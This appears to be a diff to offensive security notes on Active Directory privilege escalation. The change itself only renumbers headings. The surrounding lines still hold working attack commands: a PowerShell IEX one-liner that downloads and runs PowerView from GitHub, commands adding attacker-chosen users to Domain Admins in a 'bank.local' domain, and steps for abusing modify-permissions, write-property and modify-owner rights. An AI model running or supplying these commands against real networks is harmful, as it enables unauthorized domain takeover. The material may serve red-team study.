@@ -58,7 +58,7 @@ $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 - Modify permissions	
 - Write properties	
 
-### 1 with ✔ Modify permissions
+### 1. with ✔ Modify permissions
 
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
@@ -80,14 +80,14 @@ Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose
 Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
 ```
 
-### 2 with permission  - write all properties ✔ is  only enabled
+### 2. with permission  - write all properties ✔ is  only enabled
 
 ### if powerview  fails
 ```bash
 $Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
 $Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
 ```
-### 3 with permissions - ✔ modify owner is only enabled
+### 3. with permissions - ✔ modify owner is only enabled
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
